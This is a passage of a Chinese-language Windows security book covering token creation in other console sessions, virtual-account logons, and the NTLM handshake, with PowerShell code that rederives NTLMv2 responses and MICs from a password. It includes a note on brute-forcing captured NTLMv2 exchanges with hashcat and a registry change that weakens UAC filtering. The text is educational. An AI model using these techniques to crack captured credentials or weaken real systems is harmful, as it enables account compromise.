我们还将用户的SID添加到`SeBatchLogonRight`，这允许他们以批处理登录会话进行身份验证。通常，只有*Administrators*组的成员才能获得此访问权限。我们通过检查LSA分配的*NT AUTHORITY\BATCH*组来验证我们已作为批处理登录会话进行身份验证❾。

最后，我们使用`Remove-NtAccountRight`命令清理账户权限分配❿。这并非严格必要，因为当本地用户被删除时，LSA会清理这些分配，但我在此包含这些操作是为了演示该命令的使用。

#### 在不同控制台会话中创建进程

在某些场景下，您可能希望在不同的控制台会话中启动进程。例如，如果您在会话0中作为系统服务运行代码，您可能希望在当前已认证用户的桌面上显示消息。

要在另一个桌面上成功创建进程，您需要`SeTcbPrivilege`来更改令牌的会话ID，以及`SeAssignPrimaryTokenPrivilege`来创建进程。默认情况下，管理员用户不具备这两个特权，因此要测试此处提供的示例代码，您需要以*SYSTEM*用户身份运行PowerShell。

首先，以管理员身份运行以下命令，在您的桌面上创建一个具有所需特权的shell进程：

```
PS> Start-Win32ChildProcess ((Get-NtProcess -Current).Win32ImagePath)
-RequiredPrivilege SeTcbPrivilege,SeAssignPrimaryTokenPrivilege
```

接下来，确保在同一台机器的不同桌面上同时有两个用户已认证。如果您使用快速用户切换，您将能够轻松确认每个桌面上都创建了一个进程。

代码清单 12-11首先查找新进程的控制台会话。请以*SYSTEM*用户身份运行这些命令。

```
PS> $username = "GRAPHITE\user"
❶ PS> $console = Get-NtConsoleSession |
Where-Object FullyQualifiedUserName -eq $username
❷ PS> $token = Get-NtToken -Duplicate -TokenType Primary
PS> Enable-NtTokenPrivilege SeTcbPrivilege
PS> $token.SessionId = $console.SessionId
PS> $cmd = "cmd.exe"
❸ PS> $proc = New-Win32Process $cmd -Token $token -Desktop "WinSta0\Default"
-CreationFlags NewConsole
❹ PS> $proc.Process.SessionId -eq $console.SessionId
True

PS> $proc.Dispose()
PS> $token.Close()
```

*代码清单 12-11：在不同控制台会话中创建新进程*

我们首先选择属于名为*GRAPHITE\user*的用户的控制台会话❶。然后，我们创建当前令牌（属于*SYSTEM*用户）的副本，启用`SeTcbPrivilege`，并将控制台会话ID分配给该令牌❷。

使用这个新令牌，我们可以通过`New-Win32Process`命令创建新进程，并指定`Token`参数❸。在此例中，我们创建的是记事本的副本，但您可以通过更改命令将此进程改为任何您想要的应用程序。另请注意，我们为新进程设置了窗口站和桌面的名称，用反斜杠分隔。分别使用`WinSta0`和`Default`可确保我们在默认桌面上创建应用程序；否则，用户界面将被隐藏。

我们可以通过比较预期会话ID与实际分配给进程的会话ID来验证我们已在目标会话中创建了进程❹。在此例中，比较返回True，表示成功。如果你现在切换回另一个用户，应该会在桌面上看到以*SYSTEM*用户身份运行的记事本副本。

#### 验证虚拟账户

在第10章中，我提到过可以使用`Add-NtSidName`命令在LSA中创建自己的SID到名称的映射。一旦设置了映射，你还可以通过`LsaLogonUser`为该SID创建新令牌。代码清单 12-12演示了此过程；请以管理员身份运行这些命令。




```
PS> $domain_sid = Get-NtSid "S-1-5-99" ❶
PS> $group_sid = Get-NtSid -BaseSid $domain_sid -RelativeIdentifier 0
PS> $user_sid = Get-NtSid -BaseSid $domain_sid -RelativeIdentifier 1
PS> $domain = "CUSTOMDOMAIN"
PS> $group = "ALL USERS"
PS> $user = "USER"
PS> $token = Invoke-NtToken -System {❷
    Add-NtSidName -Domain $domain -Sid $domain_sid -Register ❸
    Add-NtSidName -Domain $domain -Name $group -Sid $group_sid -Register
    Add-NtSidName -Domain $domain -Name $user -Sid $user_sid -Register
    Add-NtAccountRight -Sid $user_sid -LogonType SeInteractiveLogonRight ❹
    Get-NtToken -Logon -Domain $domain -User $user -LogonProvider Virtual
-LogonType Interactive ❺
    Remove-NtAccountRight -Sid $user_sid -LogonType SeInteractiveLogonRight ❻
    Remove-NtSidName -Sid $domain_sid -Unregister
}
PS> Format-NtToken $token -User -Group
USER INFORMATION
----------------
Name              Sid
----              ---
CUSTOMDOMAIN\User S-1-5-99-1 ❼

GROUP SID INFORMATION
-----------------
Name                                   Attributes
----                                   ----------
Mandatory Label\Medium Mandatory Level Integrity, IntegrityEnabled
Everyone                               Mandatory, EnabledByDefault, Enabled
BUILTIN\Users                          Mandatory, EnabledByDefault, Enabled
NT AUTHORITY\INTERACTIVE               Mandatory, EnabledByDefault, Enabled
NT AUTHORITY\Authenticated Users       Mandatory, EnabledByDefault, Enabled
NT AUTHORITY\This Organization         Mandatory, EnabledByDefault, Enabled
NT AUTHORITY\LogonSessionId_0_10173    Mandatory, EnabledByDefault, Enabled, LogonId
CUSTOMDOMAIN\ALL USERS                 Mandatory, EnabledByDefault, Enabled ❽
```


*代码清单 12-12：创建虚拟账户令牌*

我们首先设置一些参数，供后续命令使用❶。我们创建三个SID：域、组和用户。这些值不需要反映真实的SID或名称。然后，我们需要添加这些SID并创建令牌，所有这些操作都需要`SeTcbPrivilege`，因此我们模拟一个*SYSTEM*令牌❷。

我们使用`Add-NtSidName`命令注册这三个SID❸。请注意，必须指定`Register`参数；否则，你只是将SID添加到PowerShell模块的名称缓存中，而不会在LSASS中注册它。添加SID后，我们需要授予用户`SeInteractiveLogonRight`权限，以便能够对其进行身份验证并接收令牌❹。如果你愿意，也可以选择其他登录权限，例如`SeServiceLogonRight`。

现在，我们可以通过`Get-NtToken`使用`LsaLogonUser`对用户进行身份验证❺。请确保指定`Virtual`登录提供程序和`Interactive`登录类型。你无需指定密码，但如果没有`SeTcbPrivilege`，则无法执行此操作。

在完成模拟之前，我们移除登录权限，然后删除域SID❻。删除域SID将自动删除组和用户SID。

最后，我们格式化令牌。现在我们可以看到用户SID是我们创建的虚拟SID❼，并且令牌自动获得组SID❽。请注意，如果我们没有为组SID添加SID到名称的映射，我们仍然会获得该SID，但该SID将无法解析为名称。我们现在可以模拟该令牌，或使用它创建以该用户身份运行的新进程。

### 总结

如你所见，交互式身份验证——即用于访问Windows桌面的过程——是一个极其复杂的主题。该身份验证过程需要结合用户界面（用于收集凭据）和Winlogon进程（用于调用LSA的`LsaLogonUser` API）。一旦API验证了用户的凭据，它就会创建一个新的登录会话，并生成一个令牌，Winlogon可以使用该令牌来创建用户的初始进程。登录会话还可以缓存凭据，这样用户就不必为了访问网络服务而重新输入它们。

接下来，我们定义了本地身份验证和域身份验证之间的区别。这里我们仅简要介绍了Netlogon如何工作，但将在第14章中更详细地介绍更常见的Kerberos。在掌握了基本身份验证机制的基础上，我们讨论了LSA如何使用用户信息来构建令牌，包括如何分配组和特权，以及UAC如何导致管理员令牌过滤。

然后，我们讨论了如何使用PowerShell模块的`Get-NtToken`命令调用`LsaLogonUser` API。我们看到，可以使用API返回的令牌来模拟用户，因为LSA会将令牌的起源ID设置为调用者的身份验证ID。我们还了解了如何通过`CreateProcessWithLogon` API（通过`New-Win32Process`命令暴露）以不同用户身份创建新进程。

最后，我们简要探讨了服务登录类型以及LSA预定义的四个账户。服务控制管理器将这些账户用于其系统服务进程。在下一章中，我们将开始探索网络身份验证如何允许用户对另一个Windows系统进行身份验证。这也将帮助我们理解域身份验证所使用的协议。

## 13. 网络身份验证

上一章讨论了交互式身份验证，它允许用户登录计算机并与桌面进行交互。相比之下，*网络身份验证*发生在用户已经向某个Windows系统完成身份验证，但希望使用另一台Windows系统上的资源时，通常通过网络进行。

执行网络身份验证的最简单方法似乎是，将用户的凭据传输到远程系统。接收凭据的服务随后可以调用`LsaLogonUser` API，并指定网络登录类型，以创建非交互式登录会话。然而，这种方法并不十分安全。要使用`LsaLogonUser`，面向网络的服务必须知道用户的完整凭据，而将这类凭据提供给远程系统会带来诸多问题。首先，我们必须信任远程服务能够安全地处理凭据。其次，如果身份验证发生在不安全的网络上，攻击者可能会截获这些凭据。

为了缓解这些安全问题，Windows实现了多种网络身份验证协议。这些协议不需要向网络服务发送用户的凭据，也不需要在网络上传输明文密码。（当然，总有一些例外情况，我们将在本章中逐一指出。）你可以在上一章讨论的安全包中找到这些网络身份验证协议，并且可以通过一个通用API来访问它们，这使得应用程序可以轻松地更换所使用的身份验证协议。

本章首先深入介绍*NT LAN Manager（NTLM）*身份验证协议——这是Windows仍在使用的历史最悠久的协议，涵盖它如何利用用户的凭据来防止其在网络上泄露。然后，我们将探讨一种众所周知的攻击方式——*NTLM中继*，以及微软为缓解这种攻击所采取的措施。

### NTLM 网络认证

NTLM 源自 *LAN Manager (LM)* 认证协议，该协议作为 LAN Manager 操作系统的一部分，支持服务器消息块（SMB）文件共享协议。微软在 Windows 3.11（即著名的 Windows for Workgroups）中重新实现了该认证协议，并在推出 Windows NT 时进一步构建并称之为 NTLM。在最新版本的 Windows 中，存在三种 NTLM 变体：

**NTLMv1**    最初的 NTLM 版本，于 Windows NT 3.1 中引入

**NTLMv2**    NTLM 的一个版本，于 NT 4 Service Pack 4 中引入，增加了额外的安全特性

**NTLMv2 Session**    NTLMv1，但带有 NTLMv2 的额外安全特性

我们将重点讨论 NTLMv2，这是 Windows Vista 及以上版本默认唯一接受其值的版本。在混合操作系统环境中（例如，访问基于 Linux 的网络存储设备时），您可能仍会遇到 NTLMv1 或 NTLMv2 Session，但在现代 Windows 环境中，这些情况应较为罕见。

图 13-1 展示了 Windows 客户端应用程序与 Windows 服务器之间发生的 NTLM 认证过程的概览。



![img](./image/03.PART%20III%20THE%20LOCAL%20SECURITY%20AUTHORITY%20AND%20AUTHENTICATION/Figure13-1.webp)

图 13-1：NTLM 认证协议概览

NTLM 认证始于客户端应用程序向服务器发起网络连接。随后，客户端与服务器交换由两台机器上的 LSA 生成的一系列二进制 *认证令牌*。对于 NTLM，这些令牌由三个认证消息组成：客户端的 NEGOTIATE 消息，指定客户端支持的功能❶；服务器的 CHALLENGE 消息，选择客户端的一个功能并提供用于交换的随机质询值❷；以及客户端的 AUTHENTICATE 消息，包含向服务器证明客户端知晓用户密码的值❸。

在高层面上，认证过程发生在两个 LSA 之间。然而，由应用程序和服务器负责通过某种网络协议传输这些认证令牌。微软在 *MS-NLMP* 中描述了该认证协议，可在线获取。该文档省略了一些功能，我将在示例中予以指出。

#### 使用 PowerShell 进行 NTLM 认证

让我们使用 PowerShell 执行网络认证，以便您查看认证令牌包含的信息。我们将使用本地用户账户，尽管域账户同样适用。

##### 初始化客户端

认证过程始于客户端应用程序调用安全支持提供程序接口（SSPI）API `AcquireCredentialsHandle`。系统实现了 SSPI API，以抽象化由安全包实现的认证协议。这使得应用程序能够更轻松地更改其使用的网络认证协议。

此 `AcquireCredentialsHandle` API 选择用于网络认证的安全包，并在需要时为认证提供显式凭据。它返回一个句柄，供第二个 SSPI API `InitializeSecurityContext` 使用，该 API 使用所选的安全包，但在 LSA 中执行。

LSA 中的安全包处理 `InitializeSecurityContext`，然后请求并返回一个 NEGOTIATE 认证令牌给调用者。NEGOTIATE 令牌描述了客户端支持哪些认证功能，并应通过网络协议发送给服务器。代码清单 13-1 在 PowerShell 中执行此客户端初始化。




```
PS> $credout = New-LsaCredentialHandle -Package "NTLM"
-UseFlag Outbound -UserName $env:USERNAME -Domain $env:USERDOMAIN
PS> $client = New-LsaClientContext -CredHandle $credout
PS> $negToken = $client.Token
PS> Format-LsaAuthToken -Token $negToken
<NTLM NEGOTIATE>
Flags: Unicode, Oem, RequestTarget, NTLM, AlwaysSign, ExtendedSessionSecurity,
Version, Key128Bit, Key56Bit
Version: 10.0.XXXXX.XX
```


*代码清单 13-1：初始化客户端进行 NTLM 认证并格式化 NEGOTIATE 认证令牌*

我们首先使用 `New-LsaCredentialHandle` 命令获取凭据句柄，该命令调用 `AcquireCredentialsHandle`。通过使用 `Package` 参数指定 NTLM，我们选择使用 NTLM 安全包。我们还指定这些凭据用于出站认证（即从客户端到服务器）。最后，我们指定当前环境中的用户名和域。

请注意，我们未指定密码；这是因为 LSA 已在我们的登录会话中缓存了密码。我们无需指定密码这一事实是 *集成 Windows 认证（IWA）* 的关键部分，它允许用户使用其凭据自动进行网络认证，而无需提示输入密码。

使用凭据句柄，我们通过调用 `New-LsaClientContext` 命令并指定该句柄来创建客户端认证上下文。在底层，此命令会调用 `InitializeSecurityContext` API。如果 API 调用成功，客户端上下文现在将包含 NEGOTIATE 令牌。我们保存一份令牌副本以备后用，然后将其传递给 `Format-LsaAuthToken` 命令以解析其内容并打印到 shell 中。

令牌的主要组成部分是一系列标志，这些标志反映了客户端请求的功能、客户端支持的功能以及令牌的哪些部分是有效的。在此例中，令牌设置了九个标志，尽管这些标志可能因系统配置而异。表 13-1 展示了这些标志在此上下文中的含义。

| 标志名称               | 描述                                                         |
| :---------------------- | :----------------------------------------------------------- |
| Unicode                 | 客户端支持 Unicode 字符串。                                  |
| Oem                     | 客户端支持字节字符串（例如，ASCII）。                        |
| RequestTarget           | 客户端要求服务器在响应中发送目标名称。                       |
| NTLM                    | 客户端请求使用 NTLM 哈希。                                   |
| AlwaysSign              | 客户端请求对认证进行签名以确保完整性。                       |
| ExtendedSessionSecurity | 客户端请求 NTLMv2 会话安全性。                               |
| Version                 | 客户端已发送操作系统和 NTLM 协议版本。                       |
| Key128Bit               | 客户端请求 128 位签名密钥。                                  |
| Key56Bit                | 客户端请求 56 位签名密钥。                                   |

您可能想知道为什么设置了 `ExtendedSessionSecurity` 标志。此标志将 NTLMv1 更改为 NTLMv2 会话安全性，但我之前提到过 NTLMv1 默认是禁用的。LSA 仍然设置该标志，以防服务器响应请求 NTLMv1。除了 `Version` 之外，这些标志都表示客户端所需的功能。`Version` 标志指示操作系统版本的主要、次要和构建值，以及 NTLM 协议版本，自 Windows Server 2003 以来该版本已固定为 15。

为确保认证协议的完整性，NTLM 根据交换中的值生成加密密钥，然后使用该密钥对整个交换应用*消息完整性代码（MIC）*。MIC 是当前交换中发送和接收的认证令牌的加密哈希。它用于检测认证令牌是否在网络传输过程中被篡改。

由于加密出口限制，NTLM 支持 40 位密钥以及 56 位和 128 位密钥，具体取决于 `Key56Bit` 和 `Key128Bit` 标志的存在。如果两个标志均未设置，NTLM 将使用 40 位密钥。`Format-LsaAuthToken` 命令隐藏了认证令牌的底层二进制值，但为了以十六进制查看令牌，我们可以向此命令传递 `AsBytes` 参数，如 代码清单 13-2 所示。




```
PS> Format-LsaAuthToken -Token $client.Token -AsBytes
          00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F  - 0123456789ABCDEF
-----------------------------------------------------------------------------
❶ 00000000: 4E 54 4C 4D 53 53 50 00 01 00 00 00 07 82 08 A2  - NTLMSSP.........
00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  - ................
00000020: 0A 00 BA 47 00 00 00 0F                          - ...G....
```


*代码清单 13-2：以十六进制格式化认证令牌*

在十六进制中，我们可以看到数据开头有一个格式指示符 `NTLMSSP` ❶。如果您在分析的数据中看到此指示符，很可能遇到了 NTLM 网络认证过程。我不会显示其余令牌的十六进制，因为如果您有兴趣查看十六进制输出，修改脚本以显示它是很容易的。

##### 初始化服务器

客户端已初始化其认证上下文并生成了 NEGOTIATE 令牌。现在，它必须将此令牌发送到服务器应用程序，以便服务器初始化自己的认证上下文。当服务器收到令牌时，它使用 `AcceptSecurityContext` API 将其传递给 LSA。LSA 检查令牌，确定其是否支持请求的功能，并生成 CHALLENGE 认证令牌作为响应。此令牌允许服务器验证客户端没有重放先前认证交换中捕获的值。

让我们使用 PowerShell 演示服务器对 NTLM 的处理。在 代码清单 13-3 中，我们在与客户端相同的进程中创建服务器认证上下文（但请记住，服务器通常运行在不同的系统上）。




```
PS> $credin = New-LsaCredentialHandle -Package "NTLM" -UseFlag Inbound
PS> $server = New-LsaServerContext -CredHandle $credin
PS> Update-LsaServerContext -Server $server -Token $client.Token
PS> $challengeToken = $server.Token
PS> Format-LsaAuthToken -Token $server.Token
<NTLM CHALLENGE>
Flags     : Unicode, RequestTarget, NTLM, AlwaysSign, TargetTypeDomain,
ExtendedSessionSecurity, TargetInfo, Version, Key128Bit, Key56Bit
TargetName: DOMAIN
Challenge : D568EB90F6A283B8
Reserved  : 0000000000000000
Version   : 10.0.XXXXX.XX
=> Target Info
NbDomainName - DOMAIN
NbComputerName - GRAPHITE
DnsDomainName - domain.local
DnsComputerName - GRAPHITE.domain.local
DnsTreeName - domain.local
Timestamp - 5/1 4:21:17 PM
```


*代码清单 13-3：初始化服务器进行 NTLM 认证并格式化 CHALLENGE 认证令牌*

我们首先创建入站凭据句柄。执行此操作时无需提供任何凭据；实际上，即使提供了凭据，NTLM 也会忽略它们。接下来，我们创建服务器的身份验证上下文，并通过调用 `Update-LsaServerContext` PowerShell 命令将客户端的 NEGOTIATE 令牌提供给 `AcceptSecurityContext` API。如果 LSA 接受了 NEGOTIATE 令牌，服务器上下文将包含其自身的令牌，即 CHALLENGE 令牌。与之前一样，我们捕获该令牌以供后续使用，并将其传递给 `Format-LsaAuthToken` 以打印其中包含的信息。

令牌的标志表示网络身份验证过程支持的值，这些值基于客户端发送的标志。例如，在 代码清单 13-1 中，我们看到客户端在其 NEGOTIATE 令牌中同时设置了 `Oem` 和 `Unicode` 字符串格式标志，表明它可以支持 Unicode 和字节字符格式的字符串。服务器已选择以 Unicode 格式发送字符串，因此它在 CHALLENGE 令牌中清除了 `Oem` 标志。

根据客户端的请求，输出中还包含 `TargetName`，在本例中为服务器的域名，由 `TargetTypeDomain` 标志指示。如果服务器不在域网络中，`TargetName` 将是服务器的计算机名，并且令牌将改用 `TargetTypeServer` 标志。

CHALLENGE 令牌包含由 LSA 生成的随机 8 字节服务器质询。下一步中计算的所有值都依赖于该质询的值；由于每次请求的质询都不同，这可以防止攻击者捕获先前的身份验证交换并将其重放给服务器。令牌的最后一部分是目标信息，由 `TargetInfo` 标志的存在指示。这包含有关服务器的其他详细信息。

请注意，NTLM 可以在无连接模式下工作，在这种模式下，客户端从不发送初始的 NEGOTIATE 消息。在这种情况下，身份验证过程从服务器的 CHALLENGE 消息开始。然而，无连接 NTLM 身份验证在实践中很少使用。

##### 将令牌传回客户端

接下来，服务器必须将 CHALLENGE 令牌发送到客户端的身份验证上下文。在真实的网络协议中，这将通过网络进行，但在 代码清单 13-4 中，我们在同一脚本中传递该令牌。




```
PS> Update-LsaClientContext -Client $client -Token $server.Token
PS> $authToken = $client.Token
PS> Format-LsaAuthToken -Token $client.Token
<NTLM AUTHENTICATE>
Flags      : Unicode, RequestTarget, NTLM, AlwaysSign, ExtendedSessionSecurity,
TargetInfo, Version, Key128Bit, Key56Bit
Domain     : GRAPHITE
UserName   : user
Workstation: GRAPHITE
LM Response: 000000000000000000000000000000000000000000000000 ❶
<NTLMv2 Challenge Response>
NT Response          : 532BB4804DD9C9DF418F8A18D67F5510 ❷
Challenge Verison    : 1
Max Challenge Verison: 1
Reserved 1           : 0x0000
Reserved 2           : 0x00000000
Timestamp            : 5/1 5:14:01 PM
Client Challenge     : 0EC1FF45C43619A0 ❸
Reserved 3           : 0x00000000
NbDomainName - DOMAIN
NbComputerName - GRAPHITE
DnsDomainName - domain.local
DnsComputerName - GRAPHITE.domain.local
DnsTreeName - domain.local
Timestamp - 5/1 5:14:01 PM
Flags - MessageIntegrity ❹
SingleHost - Z4 0x0 - Custom Data: 0100000000200000 Machine ID: 5FB8... ❺
ChannelBinding - 00000000000000000000000000000000 ❻
TargetName -
</NTLMv2 Challenge Response>
MIC        : F0E95DBEB53C885C0619FB61C5AF5956 ❼
```


*代码清单 13-4：更新客户端以进行 NTLM 身份验证并格式化 AUTHENTICATE 令牌*

我们使用 `Update-LsaClientContext` 命令，该命令再次调用 `InitializeSecurityContext`，并传入原始凭据句柄和 CHALLENGE 令牌。如果 `InitializeSecurityContext` 接受该令牌，LSA 将生成最终的 AUTHENTICATE 令牌，然后我们可以对其进行格式化。这是唯一依赖于密码值的令牌；其他两个令牌可以在没有任何特殊知识的情况下生成。

AUTHENTICATE 令牌以最终协商的标志和用户信息（包括用户名和域）开头。由于我们使用的是本地账户，域设置为工作站名称 `GRAPHITE`。接下来是 LM 响应，在本例中全为零 ❶。LM 响应通常被禁用，这就是为什么它未被指定，而 NTLMv2 根本不使用 LM 哈希。

我们现在继续到完整的 NTLMv2 响应，其中包含大量信息。首先是 8 字节的 NT 响应 ❷，在协议文档中也称为 `NTProofStr`。我们稍后将回到这个值是如何计算的。在 NT 响应之后是协议的各种参数，包括 8 字节的客户端质询 ❸。NTLMv1 已经包含服务器质询以防止重放，但 NTLMv2 添加了客户端质询，使攻击者更难使用 AUTHENTICATE 令牌来破解用户的密码。

破解用户密码

虽然 NTLM 身份验证协议不会直接泄露用户的密码，但身份验证令牌生成的值与密码存在因果关系。如果攻击者能让用户向他们控制的服务进行身份验证，他们就可以使用令牌中的值发起暴力攻击，检索密码的原始值，然后以该用户身份进行身份验证。

暴力破解可能非常耗时，尤其是当密码较长且包含多种字符时。为了加速密码破解，攻击者可能会使用彩虹表，其中包含针对不同密码的认证令牌值的许多预计算派生结果。这个过程在只有密码未知时效果最佳；否则，攻击者必须为每个未知值（如服务器质询）构建一套新的彩虹表。由于攻击者可以在用户连接时固定服务器质询，但客户端质询是随机生成的，因此彩虹表最适用于不涉及客户端质询的NTLMv1。

彩虹表的具体工作原理超出了本书的范围，但如果你有兴趣了解更多，可以在网上找到大量资源。如今，由于NTLMv1的弃用以及商品显卡性能的提升加速了暴力破解计算，彩虹表已不再流行。如果你捕获了NTLMv2交换，可以使用诸如hashcat之类的工具，在单台系统上不到一小时内暴力破解所有少于八个字符的密码。你还可以从云计算平台购买计算资源，对更复杂的密码发起攻击。

AUTHENTICATE令牌从CHALLENGE消息中复制了大部分目标信息，尽管它包含了一些额外的条目。标志表明消息包含一个带有MessageIntegrity值❹的MIC，你很快就会看到。SingleHost标志包含生成AUTHENTICATE令牌的客户端机器的随机ID❺。ChannelBinding和TargetName❻值用于防止凭据中继，我们稍后也会回到这种攻击；在这种情况下，标志未指定。最后是MIC，一种基于密钥的MD5哈希消息认证码（HMAC），计算范围涵盖当前交换中发送和接收的认证令牌❼。哈希的密钥在认证过程中计算，MIC用于检测令牌是否被篡改。

客户端将AUTHENTICATE令牌发送给服务器，服务器再次调用AcceptSecurityContext，并将令牌传递给它。LSA执行必要的计算，以验证NT响应是否与预期值匹配，以及MIC是否有效，表明令牌未被篡改。如果两个值都与预期值匹配，则认证成功。

NTLMv1和NTLMv2生成的格式化输出之间存在几个差异。首先，如果使用NTLMv1，AUTHENTICATE令牌中的NT响应将是一个24字节的二进制值，而不是代码清单 13-4中看到的结构化响应。例如，它可能看起来像下面这样：


```
NT Response: 96018E031BBF1666211D91304A0939D27EA972776C6C0191
```


你还可以通过查看标志和LM哈希来区分NTLMv1和NTLMv2 Session。如果设置了ExtendedSessionSecurity标志，则表明正在使用NTLMv2 Session；否则，系统正在使用NTLMv1。在NTLMv2中，LM哈希字段被重新用于包含客户端质询，这可能会让你感到困惑，因为你可能认为已协商了LM哈希。你可以通过客户端质询仅8字节长来区分哈希和客户端质询，如下所示：


```
LM Response: CB00748C3F04CB5700000000000000000000000000000000
```


剩余的16字节用零填充。

##### 请求令牌对象

现在认证过程已完成，服务器可以通过QuerySecurityContextToken API请求LSA为已认证用户生成Token对象，如代码清单 13-5所示。




```
PS> Update-LsaServerContext -Server $server -Token $client.Token
PS> if ((Test-LsaContext $client) -and (Test-LsaContext $server)) {
    Use-NtObject($token = Get-LsaAccessToken $server) {
        Get-NtLogonSession -Token $token
    }
}
LogonId           UserName       LogonType SessionId
-------           --------       --------- ---------
00000000-0057D74A GRAPHITE\user  Network   0
```


*代码清单 13-5：完成NTLM认证过程*

我们首先再次调用Update-LsaServerContext以完成认证过程。一旦所有令牌都已传输，客户端和服务器上下文将进入*完成状态*，这意味着它们不再需要任何信息来完成认证过程。你可以使用Test-LsaContext命令验证此状态。

认证完成后，我们可以调用Get-LsaAccessToken命令返回用户的Token对象。我们显示Token的登录会话，并验证它使用了网络认证。

网络认证与本地管理员

作为网络认证交换的结果，LSA使用本地或域策略中的组和特权生成一个令牌对象。如果认证用户既是本地用户又是本地管理员组的成员，并且UAC已启用，则会出现一个特殊情况。在这种情况下，LSA会为认证生成UAC过滤令牌，而不是完整的管理员令牌。这限制了本地管理员使用本地账户访问远程服务的能力，因为一旦他们向远程系统认证，就不再是管理员，这可能会阻止他们正确使用该服务。

如果Windows系统已加入域，域用户被添加到本地管理员组时不会受到此策略的限制。例如，Windows默认将域管理员添加到本地管理员组，因此他们不会受到过滤的影响。您还可以通过使用以下命令在注册表中设置系统策略来禁用过滤；然而，与所有系统修改一样，这可能会削弱系统的安全性，您应仅在测试系统上使用：

```
PS> New-ItemProperty -Name "LocalAccountTokenFilterPolicy" -Value 1
-Force -PropertyType DWORD
-Path 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
```

另一个设置，FilterNetworkAuthenticationTokens，将始终过滤网络认证令牌，无论其来源如何。此设置默认处于禁用状态。

#### 加密派生过程

NTLM过程绝不会在网络中以明文形式泄露用户的密码。即便如此，NTLM仍使用密码的值来派生最终的NT响应和MIC。让我们使用PowerShell来逐步演示这一加密派生过程，并生成NT响应和MIC。要执行派生，我们需要用户的密码，以及CHALLENGE和AUTHENTICATE认证令牌。

我们还需要一个函数来计算一组字节的MD5 HMAC。MD5 HMAC是一种带密钥的加密哈希算法，常用于对数据进行签名，以便验证其完整性。我们将在派生过程中多次使用此函数，该函数定义在代码清单 13-6中。

```
PS> function Get-Md5Hmac {
  ❶ Param(
        $Key,
        $Data
    )

    $algo = [System.Security.Cryptography.HMACMD5]::new($Key)
    if ($Data -is [string]) {
        $Data = [System.Text.Encoding]::Unicode.GetBytes($Data)
    }
  ❷ $algo.ComputeHash($Data)
}
```

*代码清单 13-6：定义Get-Md5Hmac函数*

该函数很简单：它创建.NET类HMACMD5，向其传递一个密钥❶，然后对数据调用ComputeHash ❷。如果数据是字符串，则首先将其转换为Unicode编码的字节数组。

我们定义的下一个函数计算*NT单向函数版本2（NTOWFv2）*，如代码清单 13-7所示。此函数将用户名、域和密码转换为16字节的密钥以供进一步使用。

```
PS> function Get-NtOwfv2 {
    Param(
        $Password,
        $UserName,
        $Domain
    )

  ❶ $key = Get-MD4Hash -String $Password
  ❷ Get-Md5Hmac -Key $key -Data ($UserName.ToUpperInvariant() + $Domain)
}

❸ PS> $key = Get-NtOwfv2 -Password "pwd" -UserName $authToken.UserName
-Domain $authToken.Domain
PS> $key | Out-HexDump
❹ D6 B7 52 89 D4 54 09 71 D9 16 D5 23 CD FB 88 1F
```

*代码清单 13-7：定义NT单向函数*

首先，请注意系统使用MD4算法对密码进行哈希处理❶。如前所述，SAM数据库存储这些MD4哈希，以便LSA无需存储其明文版本。

我们将密码的MD4哈希作为密钥提供给Get-Md5Hmac函数，然后使用此函数对转换为大写字母的用户名与域名的连接进行哈希处理❷。在本例中，这些值为user和GRAPHITE，因此我们哈希字符串USERGRAPHITE。

要执行此操作，我们调用刚刚定义的Get-NtOwfv2函数，使用AUTHENTICATE令牌中的用户名和域❸，这些值存储在$authToken变量中。该函数生成一个16字节的密钥❹。

现在我们有了基于用户密码的密钥，我们将使用它通过代码清单 13-8中定义的函数来计算NT响应值。

```
PS> function Get-NtProofStr {
    Param(
        $Key,
        $ChallengeToken,
        $AuthToken
    )

  ❶ $data = $ChallengeToken.ServerChallenge
    $last_index = $AuthToken.NtChallengeResponse.Length - 1
    $data += $AuthToken.NtChallengeResponse[16..$last_index]
  ❷ Get-Md5Hmac -Key $Key -Data $data
}
PS> $proof = Get-NtProofStr -Key $key -ChallengeToken $ChallengeToken
-AuthToken $AuthToken
PS> $proof | Out-HexDump
❸ 53 2B B4 80 4D D9 C9 DF 41 8F 8A 18 D6 7F 55 10
```

*代码清单 13-8：计算NtProofStr值*

我们使用NTOWFv2密钥以及CHALLENGE和AUTHENTICATE令牌来执行NT响应的计算。首先，我们将CHALLENGE令牌中的8字节服务器质询与AUTHENTICATE令牌中的NtChallengeResponse（减去提供的16字节NT响应）连接起来❶。然后，我们使用Get-Md5Hmac函数计算NT值，以NTOWFv2作为密钥❷。结果❸应与代码清单 13-4中的NT响应值匹配（如果您使用了实际密码而不是清单中使用的pwd占位符）。

服务器现在可以通过检查两个NT响应值是否匹配来验证客户端是否拥有用户的正确密码。然而，我们仍然需要验证消息是否以某种方式被篡改，因此我们需要计算MIC。我们在代码清单 13-9中定义执行此操作的函数。

```
PS> function Get-Mic {
    Param(
        $Key,
        $Proof,
        $NegToken,
        $ChallengeToken,
        $AuthToken
    )

  ❶ $session_key = Get-Md5Hmac -Key $Key -Data $Proof

    $auth_data = $AuthToken.ToArray()
  ❷ [array]::Clear($auth_data, $AuthToken.MessageIntegrityCodeOffset, 16)
  ❸ $data = $NegToken.ToArray() + $ChallengeToken.ToArray() + $auth_data
  ❹ Get-Md5Hmac -Key $session_key -Data $data
}
PS> $mic = Get-Mic -Key $key -Proof $proof -NegToken $NegToken
-ChallengeToken $ChallengeToken -AuthToken $AuthToken
PS> $mic | Out-HexDump
❺ F0 E9 5D BE B5 3C 88 5C 06 19 FB 61 C5 AF 59 56
```

*代码清单 13-9：计算消息完整性代码*

Get-Mic 函数接受五个参数：NTOWFv2 密钥、NT 响应以及客户端与服务器之间传输的所有三个令牌。首要任务是再次使用 Get-Md5Hmac 计算会话密钥 ❶。我们使用 NTOWFv2 密钥进行此 HMAC 操作，并将 NT 响应作为数据提供。接下来，我们将 AUTHENTICATE 令牌中的 MIC 字段清零 ❷，然后拼接这些令牌 ❸。我们将会话密钥和拼接后的令牌传递给 Get-Md5Hmac 以生成 MIC ❹。MIC 的值 ❺ 应与 代码清单 13-4 中生成的值匹配。

#### 传递认证

